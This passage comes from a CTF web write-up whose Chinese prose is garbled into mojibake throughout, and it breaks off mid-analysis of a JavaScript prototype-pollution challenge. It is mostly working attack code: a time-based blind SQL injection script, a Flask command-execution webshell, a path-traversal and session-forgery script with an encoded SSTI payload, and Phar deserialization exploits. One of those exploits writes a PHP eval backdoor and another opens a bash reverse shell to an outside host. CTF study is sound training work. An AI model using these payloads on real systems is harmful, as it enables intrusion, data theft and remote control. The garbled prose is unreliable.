    Url = "http://aa747dea-4776-4d4f-9c3f-6846c5f580aa.node4.buuoj.cn:81/?id=1/**/and/**/if(length((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like('ctf')))>{0},1,sleep(3))#"
    UrlFormat = Url.format(l)      
    start_time0 = time.time()  		
    requests.get(UrlFormat)
    if  time.time() - start_time0 > 2:	
            print('tableé•¿åº¦ä¸ºï¼š' + str(l))
            global TB_length 
            TB_length = l	
            break
    else:
        pass
for i in range(1,TB_length+1):
    for char in chars:
        charAscii = ord(char) #charè½¬æ¢ä¸ºascii
        url = "http://aa747dea-4776-4d4f-9c3f-6846c5f580aa.node4.buuoj.cn:81/?id=1/**/and/**/if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like('ctf')),{0},1))>{1},1,sleep(3))#"
        urlformat = url.format(i,charAscii)
        start_time = time.time()
        requests.get(urlformat)
        if  time.time() - start_time > 2:
            table+=char
            print('tableç¬¬{}ä¸ªå­—ç¬¦ï¼š{}'.format(i, table))
            break
        else:
            pass
print('tableï¼š ' + table)

#çˆ†åˆ—
for l in range(1,20):
    Url = "http://aa747dea-4776-4d4f-9c3f-6846c5f580aa.node4.buuoj.cn:81/?id=1/**/and/**/if(length((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like('items')))>{0},1,sleep(3))#"
    UrlFormat = Url.format(l)      
    start_time0 = time.time()  		
    requests.get(UrlFormat)
    if  time.time() - start_time0 > 2:	
            print('columné•¿åº¦ä¸ºï¼š' + str(l))
            global CL_length 
            CL_length = l	
            break
    else:
        pass
for i in range(1,CL_length+1):
    for char in chars:
        charAscii = ord(char) #charè½¬æ¢ä¸ºascii
        url = "http://aa747dea-4776-4d4f-9c3f-6846c5f580aa.node4.buuoj.cn:81/?id=1/**/and/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like('items')),{0},1))>{1},1,sleep(3))#"
        urlformat = url.format(i,charAscii)
        start_time = time.time()
        requests.get(urlformat)
        if  time.time() - start_time > 2:
            column+=char
            print('columnç¬¬{}ä¸ªå­—ç¬¦ï¼š{}'.format(i, column))
            break
        else:
            pass
print('columnï¼š ' + column)


#çˆ†æ•°æ®
for i in range(1,80):
    for char in chars:
        charAscii = ord(char) #charè½¬æ¢ä¸ºascii
        url = "http://aa747dea-4776-4d4f-9c3f-6846c5f580aa.node4.buuoj.cn:81/?id=1/**/and/**/if(ascii(substr((select/**/group_concat(id,name,price)/**/from/**/items),{0},1))>{1},1,sleep(3))#"
        urlformat = url.format(i,charAscii)
        start_time = time.time()
        requests.get(urlformat)
        if  time.time() - start_time > 2:
            flag+=char
            print('flagç¬¬{}ä¸ªå­—ç¬¦ï¼š{}'.format(i, flag))
            break
        else:
            pass
print('flagï¼š ' + flag)
```

### flask diskï¼ˆflask debugæ¨¡å¼ï¼Œä¸Šä¼ app.pyæ–‡ä»¶è¦†ç›–åŸæ–‡ä»¶ï¼ŒRCEï¼‰

æ‰“å¼€é¢˜ç›®ï¼Œæœ‰ä¸‰ä¸ªé“¾æ¥
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/df6f9bfd3f0b4b5fb66c9901a19c266e.png)åˆ†åˆ«æ˜¯æŸ¥çœ‹æ–‡ä»¶ï¼Œä¸Šä¼ æ–‡ä»¶ï¼Œè¾“å…¥pinç è¿›å…¥`admin manage`

è®¿é—®admin manageå‘ç°è¦è¾“å…¥pinç ï¼Œè¯´æ˜flaskå¼€å¯äº†debugæ¨¡å¼ã€‚flaskå¼€å¯äº†debugæ¨¡å¼ä¸‹ï¼Œapp.pyæºæ–‡ä»¶è¢«ä¿®æ”¹åä¼šç«‹åˆ»åŠ è½½ã€‚æ‰€ä»¥åªéœ€è¦ä¸Šä¼ ä¸€ä¸ªèƒ½rceçš„app.pyæ–‡ä»¶æŠŠåŸæ¥çš„è¦†ç›–ï¼Œå°±å¯ä»¥äº†ã€‚
 (æ³¨ï¼šè¯­æ³•ä¸èƒ½å‡ºé”™)

```python
#app.py
from flask import Flask,request
import os
app = Flask(__name__)
@app.route('/')
def index():    
    try:        
        cmd = request.args.get('cmd')        
        data = os.popen(cmd).read()        
        return data    
    except:        
        pass    
        
    return "1"#å›æ˜¾ä¸€ä¸ª1,æ–¹ä¾¿æŸ¥çœ‹æ˜¯å¦ä¸Šä¼ æ›´æ–°æˆåŠŸ
if __name__=='__main__':    
    app.run(host='0.0.0.0',port=5000,debug=True)
```

ä¸Šä¼ æˆåŠŸåï¼Œç›´æ¥åœ¨è·Ÿè·¯ç”±å‘½ä»¤æ‰§è¡Œ
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/4a5faac0717044dc80f0c75772d54081.png)

### InjectMeï¼ˆå¤æ‚SSTIï¼‰

> è€ƒç‚¹ï¼šsessionä¼ªé€ ï¼Œssti

ä¸‹è½½é™„ä»¶ï¼Œå‘ç°æ˜¯æ³„éœ²äº†ç›®å½•`./app`
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/7f357db7075a437eab320fa25d5ab0df.png)æ‰“å¼€é¢˜ç›®ï¼Œç»™äº†downloadçš„éƒ¨åˆ†æºç 
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/c7062a748c21439bb61807eec84e50ec.png)åˆ†æä¸€ä¸‹ï¼Œ`./download`è·¯ç”±ä¸‹ï¼Œæ¥å—GETå‚æ•°fileï¼Œå¦‚æœæ²¡æœ‰åˆ™filenameä¸ºç©ºå€¼ï¼Œç„¶åæ˜¯è¿‡æ»¤äº†`../`ï¼Œç”±äºè¿™é‡Œæ˜¯æ›¿æ¢ä¸ºç©ºï¼Œå¯ä»¥ç»•è¿‡ã€‚ç„¶åæ‹¼æ¥è·¯å¾„ï¼Œå¦‚æœå­˜åœ¨åˆ™è¿”å›

ç»“åˆDockerfileæ³„éœ²çš„ç›®å½•ï¼Œå¯ä»¥çŒœåˆ°è¿è¡Œæ–‡ä»¶ï¼Œç›´æ¥ç›®å½•ç©¿è¶Šè¯»å–æºç 

```
/download?file=..././..././..././app/app.py
```

æºç å¦‚ä¸‹

```python
import os
import re

from flask import Flask, render_template, request, abort, send_file, session, render_template_string
from config import secret_key

app = Flask(__name__)
app.secret_key = secret_key


@app.route('/')
def hello_world():  # put application's code here
    return render_template('index.html')


@app.route("/cancanneed", methods=["GET"])
def cancanneed():
    all_filename = os.listdir('./static/img/')
    filename = request.args.get('file', '')
    if filename:
        return render_template('img.html', filename=filename, all_filename=all_filename)
    else:
        return f"{str(os.listdir('./static/img/'))} <br> <a href=\"/cancanneed?file=1.jpg\">/cancanneed?file=1.jpg</a>"


@app.route("/download", methods=["GET"])
def download():
    filename = request.args.get('file', '')
    if filename:
        filename = filename.replace('../', '')
        filename = os.path.join('static/img/', filename)
        print(filename)
        if (os.path.exists(filename)) and ("start" not in filename):
            return send_file(filename)
        else:
            abort(500)
    else:
        abort(404)


@app.route('/backdoor', methods=["GET"])
def backdoor():
    try:
        print(session.get("user"))
        if session.get("user") is None:
            session['user'] = "guest"
        name = session.get("user")
        if re.findall(
                r'__|{{|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.',
                name):
            abort(500)
        else:
            return render_template_string(
                'ç«Ÿç„¶ç»™<h1>%s</h1>ä½ æ‰¾åˆ°äº†æˆ‘çš„åé—¨ï¼Œä½ ä¸€å®šæ˜¯ç½‘ç»œå®‰å…¨å¤§èµ›å† å†›å§ï¼ğŸ˜ <br> é‚£ä¹ˆ ç°åœ¨è½®åˆ°ä½ äº†!<br> æœ€åç¥æ‚¨ç©å¾—æ„‰å¿«!ğŸ˜' % name)
    except Exception:
        abort(500)


@app.errorhandler(404)
def page_not_find(e):
    return render_template('404.html'), 404


@app.errorhandler(500)
def internal_server_error(e):
    return render_template('500.html'), 500


if __name__ == '__main__':
    app.run('0.0.0.0', port=8080)
```

åˆ†æä¸€ä¸‹
 å­˜åœ¨`./backdoor`è·¯ç”±ï¼Œè·å–sessionä¸­userçš„å€¼ï¼Œå¦‚æœæ²¡æœ‰èµ‹å€¼ä¸ºguestï¼Œæœ‰çš„è¯è¿›è¡Œæ­£åˆ™åŒ¹é…ï¼ˆæ­¤å¤„å­˜åœ¨sstiæ¼æ´ï¼‰
 æ ¹æ®æºç ï¼Œsecret_keyåœ¨config.pyé‡Œï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®ä¸‹è½½å¾—åˆ°key

è·å–key

```
/download?file=..././..././..././app/config.py
```

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/cfe048192e9c4087b2a3baac0c24c862.png)ç„¶åè§£å¯†
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/65cd2fe4918c46819cc6ab5bfc040461.png)
 ç”±äºè¿‡æ»¤äº†å¾ˆå¤šï¼Œè¿™é‡Œç”¨å…«è¿›åˆ¶ç¼–ç ç»•è¿‡
 è„šæœ¬å¦‚ä¸‹

```python
import re
import requests
import subprocess
# æŠŠè¿™ä¸ªä¸‹è½½äº†ï¼Œéœ€è¦ä½¿ç”¨é‡Œé¢çš„flask-session-cookie-manager3.py
# # https://github.com/noraj/flask-session-cookie-manager

def string_to_octal_ascii(s):
    octal_ascii = ""
    for char in s:
        char_code = ord(char)
        octal_ascii += "\\\\" + format(char_code, '03o')
        # octal_ascii += "\\\\" + format(char_code, 'o')    
    return octal_ascii
secret_key = "y0u_n3ver_k0nw_s3cret_key_1s_newst4r"
# payload = "{%print(7*7)%}"
# payload = "{%print(\"\"\\\\u005f\\\\u005f\"\")%}"
# payload = "{%print(\"\"\\\\x5f\\\\x5f\"\")%}"

eval_shell = "\"\""+string_to_octal_ascii("__import__(\"os\").popen(\"cat /*\").read()")+"\"\""
print(eval_shell)
# dockeréƒ¨ç½²&windowsè¿è¡Œpayload
# {{x.__init__.__globals__.__builtins__.eval('__import__("os").popen("dir").read()')}}
payload = "{{%print(xxx|attr(\"\"\\\\137\\\\137\\\\151\\\\156\\\\151\\\\164\\\\137\\\\137\"\")|attr(\"\"\\\\137\\\\137\\\\147\\\\154\\\\157\\\\142\\\\141\\\\154\\\\163\\\\137\\\\137\"\")|attr(\"\"\\\\137\\\\137\\\\147\\\\145\\\\164\\\\151\\\\164\\\\145\\\\155\\\\137\\\\137\"\")(\"\"\\\\137\\\\137\\\\142\\\\165\\\\151\\\\154\\\\164\\\\151\\\\156\\\\163\\\\137\\\\137\"\")|attr(\"\"\\\\137\\\\137\\\\147\\\\145\\\\164\\\\151\\\\164\\\\145\\\\155\\\\137\\\\137\"\")(\"\"\\\\145\\\\166\\\\141\\\\154\"\")({0}))%}}".format(eval_shell)
print(payload)
command = "python flask_session_cookie_manager3.py encode -s \"{0}\" -t \"{{'user':'{1}'}}\"".format(secret_key,payload)
print(command)

session_data = subprocess.check_output(command, shell=True)
print(session_data)
# linuxå’Œwindowsæ¢è¡Œä¸ä¸€æ ·ï¼Œlinuxæ˜¯å»æ‰æœ€åä¸€ä¸ªï¼Œwindowsæ˜¯æœ€åä¸¤ä¸ªã€‚
session_data = session_data[:-2].decode('utf-8')
# session_data = session_data[:-1].decode('utf-8')
print(session_data)

url = "http://127.0.0.1:8080/backdoor"
cookies = {"session": session_data}
res = requests.get(url=url, cookies=cookies)
# print(res.text)
pattern = r'<h1>(.*)</h1>'
result_content = re.search(pattern, res.text, re.S)
# print(result_content)
if result_content:
    result = result_content.group(1)
    print(result)
else:
    print("something wrong!")
```

å¾—åˆ°flag
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/c0a7b61f2cc94e99a9bc6f957c6fb1c4.png)

### PharOne(Pharååºåˆ—åŒ–ã€gzipå‹ç¼©ç»•è¿‡è¿‡æ»¤ã€æ— å›æ˜¾RCE)

> è€ƒç‚¹ï¼šPharååºåˆ—åŒ–ã€gzipå‹ç¼©ã€æ— å›æ˜¾RCE

æ‰“å¼€é¢˜ç›®ï¼Œæœ‰æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼ŒF12æœ‰æç¤ºclass.php
 è®¿é—®`./class.php`ï¼Œå¾—åˆ°æºç 

```php
 <?php
highlight_file(__FILE__);
class Flag{
    public $cmd;
    public function __destruct()
    {
        @exec($this->cmd);
    }
}
@unlink($_POST['file']); 
```

ç»“åˆæ–‡ä»¶ä¸Šä¼ ï¼Œè€ƒè™‘pharååºåˆ—åŒ–ï¼›åŒæ—¶è¿˜æ˜¯æ— å›æ˜¾RCEï¼Œç”¨å†™å…¥é©¬å’Œåå¼¹shelléƒ½è¡Œ

ç”¨æ™®é€šçš„pharæ–‡ä»¶ä¸Šä¼ å‘ç°ä¸è¡Œï¼ˆjpgæ‰è¡Œï¼‰
 ä¿®æ”¹ç„¶åä¸Šä¼ å‘ç°è¢«æ­£åˆ™åŒ¹é…
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/af07881b433d4a10a548767ca6b28945.png)ç»•è¿‡æ­£åˆ™åŒ¹é…ï¼Œè¿™é‡Œç”¨çš„æ˜¯gzipå‹ç¼©çš„æ–¹æ³•

#### æ–¹æ³•ä¸€ å†™é©¬

exp

```php
<?php
class Flag{
    public $cmd;
}

$a=new Flag();
$a->cmd="echo \"<?=@eval(\\\$_POST['a']);\">/var/www/html/1.php";
//è¿™é‡Œ$_POSTå‰é¢è¦ä¸‰ä¸ª\\\,è¿™æ ·æ‰èƒ½æ­£ç¡®è§£é‡Šä¸ºè¶…çº§å…¨å±€å˜é‡ï¼Œä¸¤ä¸ªçš„è¯ä¼šè¢«å½“æˆæ™®é€šå˜é‡
$phar = new Phar("hacker.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($a);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
```

ç„¶ågzipå‘½ä»¤å‹ç¼©
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/fc612d0e967742f2b66114ab24b9f38b.png)

ä¸Šä¼ æˆåŠŸåï¼Œè®¿é—®`./class.php`
 ä½¿ç”¨pharä¼ªåè®®è¯»å–ä¸Šä¼ æ–‡ä»¶

```php
file=phar://upload/9e32fd5eb93d0766e32d9e33cc3ef2d5.jpg
```

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/6bba02f9156d4c46b1b5a97fb893add8.png)æ‰§è¡ŒæˆåŠŸåï¼Œè®¿é—®å†™å…¥çš„1.phpï¼Œå¾—åˆ°flag
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/17158a4ef0b5424eb96b00952640c6d7.png)

#### æ–¹æ³•äºŒ åå¼¹shell

exp

```php
<?php
class Flag{
    public $cmd;
}

$a=new Flag();
$a->cmd="bash -c 'bash -i >& /dev/tcp/f57819674z.imdo.co/54789 0>&1'";
$phar = new Phar("hacker.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($a);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
```

ç„¶åå°±å’Œæ–¹æ³•ä¸€å·®ä¸å¤šï¼Œå…ˆgzipå‹ç¼©æ”¹åç¼€ï¼Œç„¶åpharä¼ªåè®®è¯»å–
 æˆåŠŸåå¼¹shell
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/3e8d1db636b94bb98b12297e8cf53757.png)

### OtenkiBoyï¼ˆjsåŸå‹é“¾æ±¡æŸ“,è¿‡æ»¤äº†`__proto__`ï¼‰

> è€ƒç‚¹ï¼šJavaSctipt åŸå‹é“¾æ±¡æŸ“

é¢˜ç›®ç»™äº†æºç ï¼Œé¦–å…ˆæ˜¯app.js

```js
const env = global.env = (process.env.NODE_ENV || "production").trim();
const isEnvDev = global.isEnvDev = env === "development";
const devOnly = (fn) => isEnvDev ? (typeof fn === "function" ? fn() : fn) : undefined
const CONFIG = require("./config"), DEFAULT_CONFIG = require("./config.default");
const PORT = CONFIG.server_port || DEFAULT_CONFIG.server_port;

const path = require("path");
const Koa = require("koa");
const bodyParser = require("koa-bodyparser");

const app = new Koa();

app.use(require('koa-static')(path.join(__dirname, './static')));
devOnly(_ => require("./webpack.proxies.dev").forEach(p => app.use(p)));
app.use(bodyParser({
    onerror: function (err, ctx) {
        // If the json is invalid, the body will be set to {}. That means, the request json would be seen as empty.
        if (err.status === 400 && err.name === 'SyntaxError' && ctx.request.type === 'application/json') {
            ctx.request.body = {}
        } else {
            throw err;
        }
    }
}));

[
    "info",
    "submit"
].forEach(p => { p = require("./routes/" + p); app.use(p.routes()).use(p.allowedMethods()) });

app.listen(PORT, () => {
    console.info(`Server is running at port ${PORT}...`);
})

module.exports = app;
```

ç»™äº†ä¸¤ä¸ªè·¯ç”±ï¼Œåˆ†åˆ«æ˜¯`./info`å’Œ`./submit`
 è¿½è¸ªä¸€ä¸‹`submit.js`

```js
const Router = require("koa-router");
const router = new Router();
const SQL = require("./sql");
const sql = new SQL("wishes");
const { rndID, mergeJSON } = require("./_components/utils");

async function insert2db(data) {
    let date = String(data["date"]), place = String(data["place"]),
        contact = String(data["contact"]), reason = String(data["reason"]);
    const timestamp = Date.now();
    const wishid = rndID(24, timestamp);
    await sql.run(`INSERT INTO wishes (wishid, date, place, contact, reason, timestamp) VALUES (?, ?, ?, ?, ?, ?)`,
        [wishid, date, place, contact, reason, timestamp]).catch(e => { throw e });
    return { wishid, date, place, contact, reason, timestamp }
}

router.post("/submit", async (ctx) => {
    if (ctx.header["content-type"] !== "application/json")
        return ctx.body = {
            status: "error",
            msg: "Content-Type must be application/json"
        }

    const jsonText = ctx.request.rawBody || "{}"
    try {
        const data = JSON.parse(jsonText);

        if (typeof data["contact"] !== "string" || typeof data["reason"] !== "string")
            return ctx.body = {
                status: "error",
                msg: "Invalid parameter"
            }
        if (data["contact"].length <= 0 || data["reason"].length <= 0)
            return ctx.body = {
                status: "error",
                msg: "Parameters contact and reason cannot be empty"
            }

        const DEFAULT = {
            date: "unknown",
            place: "unknown"
        }
        const result = await insert2db(mergeJSON(DEFAULT, data));
        ctx.body = {
            status: "success",
            data: result
        };
    } catch (e) {
        console.error(e);
        ctx.body = {
            status: "error",
            msg: "Internal Server Error"
        }
    }
})

module.exports = router;
```

å¤§æ¦‚è¿‡ç¨‹å°±æ˜¯æ£€æµ‹content-typeæ˜¯å¦ä¸ºapplication/jsonï¼Œç„¶åå°±æ˜¯å…³é”®è¯­å¥

```
const result = await insert2db(mergeJSON(DEFAULT, data));
```

è¿™é‡Œçš„dataå‚æ•°æ˜¯å¯æ§çš„ï¼Œç»§ç»­è¿½è¸ªmergeJSONå‡½æ•°ï¼Œåœ¨`\routes\_components`çš„utils.jsé‡Œé¢

```js
const mergeJSON = function (target, patch, deep = false) {
    if (typeof patch !== "object") return patch;
    if (Array.isArray(patch)) return patch; // do not recurse into arrays
    if (!target) target = {}
    if (deep) { target = copyJSON(target), patch = copyJSON(patch); }
    for (let key in patch) {
        if (key === "__proto__") continue;
        if (target[key] !== patch[key])
            target[key] = mergeJSON(target[key], patch[key]);
    }
    return target;
}
```

å¯ä»¥å‘ç°å­˜åœ¨åŸå‹é“¾æ±¡æŸ“ï¼Œè™½ç„¶è¿‡æ»¤äº†`__proto__`ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨`constructor.prototype`å»ä»£æ›¿

æ¥ä¸‹æ¥æ˜¯å¯»æ‰¾æ³¨å…¥ç‚¹ï¼ŒæŸ¥çœ‹`routes/info.js`

```js
const Router = require("koa-router");
const router = new Router();
const SQL = require("./sql");
const sql = new SQL("wishes");
const { mergeJSON, createDate } = require("./_components/utils");
const CONFIG = mergeJSON(require("../config.default"), require("../config"), true);
const DEFAULT_CONFIG = require("../config.default");
const LauchTime = new Date();

async function getInfo(timestamp) {
    timestamp = typeof timestamp === "number" ? timestamp : Date.now();
    // Remove test data from before the movie was released
    let minTimestamp;
    try {
        minTimestamp = createDate(CONFIG.min_public_time).getTime();
        if (!Number.isSafeInteger(minTimestamp)) throw new Error("Invalid configuration min_public_time.");
    } catch (e) {
        console.warn(`\x1b[33m${e.message}\x1b[0m`);
        console.warn(`Try using default value ${DEFAULT_CONFIG.min_public_time}.`);
        minTimestamp = createDate(DEFAULT_CONFIG.min_public_time, { UTC: false, baseDate: LauchTime }).getTime();
    }
    timestamp = Math.max(timestamp, minTimestamp);
    const data = await sql.all(`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp >= ?`, [timestamp]).catch(e => { throw e });
    return data;
}

router.post("/info/:ts?", async (ctx) => {
    if (ctx.header["content-type"] !== "application/x-www-form-urlencoded")
        return ctx.body = {
            status: "error",
            msg: "Content-Type must be application/x-www-form-urlencoded"
        }
    if (typeof ctx.params.ts === "undefined") ctx.params.ts = '0'
    const timestamp = /^[0-9]+$/.test(ctx.params.ts || "") ? Number(ctx.params.ts) : ctx.params.ts;
    if (typeof timestamp !== "number")
        return ctx.body = {
            status: "error",
            msg: "Invalid parameter ts"
        }

    try {
        const data = await getInfo(timestamp).catch(e => { throw e });
        ctx.body = {
            status: "success",
            data: data
        }
    } catch (e) {
        console.error(e);
        return ctx.body = {
            status: "error",
            msg: "Internal Server Error"
        }
    }
})

module.exports = router;
```

å…³é”®éƒ¨åˆ†ä¸ºgetInfoå‡½æ•°ï¼ŒminTimestampå–è‡ªé…ç½®æ–‡ä»¶ï¼Œåœ¨Math.maxå¤„ä¸ºå¯æ§çš„timestampè®¾ç½®ä¸‹é™å€¼ï¼Œæˆ‘ä»¬éœ€è¦å°†minTimestampæ”¹å°æ¥è·å–æ›´æ—©çš„æ•°æ®åº“æ•°æ®ã€‚

ç„¶åè¿½è¸ªcreateDateå‡½æ•°ï¼Œåœ¨`routes/_components/utils.js`ä¸­
 å­˜åœ¨å‡ ä¸ªæ³¨å…¥ç‚¹

- opts æ³¨å…¥ç‚¹

```js
const DEFAULT_CREATE_DATE_OPTIONS = {
    UTC: false,
    format: [
        "yyyy-MM-dd HH:mm:ss",
        "yyyy-MM-dd HH:mm:ss.fff",
        "yyyy-MM-dd",
        "MM/dd/yyyy",
        "MM/dd/yyyy HH:mm:ss",
        "MM/dd/yyyy HH:mm:ss.fff",
        "MM/dd/yy HH:mm:ss",
        "HH:mm:ss",
        "HH:mm:ss.fff"
    ],
    // baseDate: undefined
}

const createDate = (str, opts) => {
    const CopiedDefaultOptions = copyJSON(DEFAULT_CREATE_DATE_OPTIONS)
    if (typeof opts === "undefined") opts = CopiedDefaultOptions
    if (typeof opts !== "object") opts = { ...CopiedDefaultOptions, UTC: Boolean(opts) };
    opts.UTC = typeof opts.UTC === "undefined" ? CopiedDefaultOptions.UTC : Boolean(opts.UTC);
    opts.format = opts.format || CopiedDefaultOptions.format;
    if (!Array.isArray(opts.format)) opts.format = [opts.format]
    opts.format = opts.format.filter(f => typeof f === "string")
        .filter(f => {
            if (/yy|yyyy|MM|dd|HH|mm|ss|fff/.test(f) === false) {
                console.warn(`Invalid format "${f}".`, `At least one format specifier is required.`);
                return false;
            }
            if (`|${f}|`.replace(/yyyy/g, "yy").split(/yy|MM|dd|HH|mm|ss|fff/).includes("")) {
                console.warn(`Invalid format "${f}".`, `Delimeters are required between format specifiers.`);
                return false;
            }
            if (f.includes("yyyy") && f.replace(/yyyy/g, "").includes("yy")) {
                console.warn(`Invalid format "${f}".`, `"yyyy" and "yy" cannot be used together.`);
                return false;
            }
            return true;
        })
    opts.baseDate = new Date(opts.baseDate || Date.now());
```

å½“createDateçš„optsæœªæŒ‡å®šæ—¶å¹¶ä¸èƒ½æ³¨å…¥ï¼Œä½†æ˜¯å½“optsä¸º JSON å¯¹è±¡ä¸”æ²¡æœ‰æŒ‡å®šformatå±æ€§æ—¶ï¼Œä¸‹é¢è¿™ä¸€è¡Œä¼šè§¦å‘åŸå‹é“¾

```
opts.format = opts.format || CopiedDefaultOptions.format;
```

è€Œå¯¹äºbaseDateï¼Œç”±äºDEFAULT_CREATE_DATE_OPTIONSä¸­æœ¬èº«ä¸å«baseDateï¼ˆundefinedï¼‰ï¼Œå¯ç›´æ¥è§¦å‘è¯¥åŸå‹é“¾

```
opts.baseDate = new Date(opts.baseDate || Date.now());
```

- æ—¶é—´å‡½æ•°æ³¨å…¥ç‚¹

åœ¨utility functionsçš„æ³¨é‡Šéƒ¨åˆ†å­˜åœ¨å‡½æ•°

```js
const getHMS = (time) => {
            let regres = /^(\d+) *\: *(\d+)( *\: *(\d+)( *\. *(\d+))?)?$/.exec(time.trim())
            if (regres === null) return {}
            let [n1, n2, n3, n4] = [regres[1], regres[2], regres[4], regres[6]].map(t => typeof t === "undefined" ? undefined : Number(t));
            if (typeof n3 === "undefined") n3 = 0; // 23:59(:59)?
            if (0 <= n1 && n1 <= 23 && 0 <= n2 && n2 <= 59 && 0 <= n3 && n3 <= 59) {
                // 23:59:59(.999)?
                let HH = pad(n1, 2), mm = pad(n2, 2), ss = pad(n3, 2),
                    fff = typeof n4 === "undefined" ? undefined : pad(n4, 3).substring(0, 3);
                const o = { HH, mm, ss }
                if (typeof fff !== "undefined") o.fff = fff;
                return o;
            } else return {}
        }
```

ä¸»è¦çœ‹æœ€åå‡ è¡Œï¼Œå¦‚æœfffï¼ˆå³æ¯«ç§’ï¼‰æœªè¢«å®šä¹‰ï¼Œé‚£ä¹ˆè¿”å›å€¼ä¸­å°±ä¸ä¼šå¸¦æœ‰fffå±æ€§
 è°ƒç”¨getHMSå‡½æ•°çš„åœ°æ–¹åœ¨createDateçš„æœ«å°¾å‡ è¡Œï¼Œå±äºcreateDateçš„ Fallback Auto Detection éƒ¨åˆ†

```js
const { HH, mm, ss, fff } = getHMS(time_str)
```

å½“time_strä¸­ä¸åŒ…å«æ¯«ç§’ï¼Œèƒ½å¤Ÿè§¦å‘åŸå‹é“¾

æ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•åˆ©ç”¨æ¼æ´çš„é—®é¢˜äº†

```js
sortTable.forEach((f, i) => {
    if (f == "yy") {
        let year = Number(regres[i + 1])
        year = year < 100 ? (1900 + year) : year;
        return argTable["yyyy"] = year;
    }
    argTable[f] = Number(regres[i + 1])
})
```

æˆ‘ä»¬å‘ç°createDateçš„optsçš„formatæ”¯æŒyyæ ‡è¯†ç¬¦ï¼Œè€Œå½“å¹´ä»½å°äº100æ—¶ï¼Œæˆ‘ä»¬è®¤ä¸ºæ˜¯20ä¸–çºªçš„å¹´ä»½
 ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœformatä¸º20yy-MM-ddï¼Œåœ¨formatè§£æå­—ç¬¦ä¸²2023-10-01æ—¶ï¼Œå°†è§£æyyä¸º23ï¼Œè¾“å‡ºè¾“å‡ºä¸º1923ï¼Œæœ€ç»ˆè¾“å‡ºçš„å¹´ä»½æ˜¯1923-10-01

**ç›®æ ‡ï¼šæ±¡æŸ“format**
 å‰é¢æåˆ°ï¼Œæ±¡æŸ“formatçš„æ¡ä»¶æ˜¯optsä¸º JSON å¯¹è±¡ä¸”æ²¡æœ‰æŒ‡å®šformatå±æ€§ï¼Œè§‚å¯Ÿroutes/infoä¸­çš„ç›¸åº”ç‰‡æ®µï¼Œæˆ‘ä»¬éœ€è¦è§¦å‘ä¸‹é¢çš„catch

```js
try {
    minTimestamp = createDate(CONFIG.min_public_time).getTime();
    if (!Number.isSafeInteger(minTimestamp)) throw new Error("Invalid configuration min_public_time.");
} catch (e) {
    console.warn(`\x1b[33m${e.message}\x1b[0m`);
    console.warn(`Try using default value ${DEFAULT_CONFIG.min_public_time}.`);
    minTimestamp = createDate(DEFAULT_CONFIG.min_public_time, { UTC: false, baseDate: LauchTime }).getTime();
}
```

è§¦å‘catchçš„æ¡ä»¶æ˜¯å‰é¢tryçš„createDateè¿”å›ä¸€ä¸ªæ— æ•ˆçš„æ—¥æœŸï¼Œæˆ–è€…createDateæœ¬èº«è¢«è°ƒç”¨æ—¶æ³•ç¥é”™è¯¯ï¼Œæ‰€ä»¥å°±è¦åˆ©ç”¨æˆ‘ä»¬åˆšåˆšæ‰¾åˆ°çš„ä¸¤ä¸ªæ³¨å…¥ç‚¹
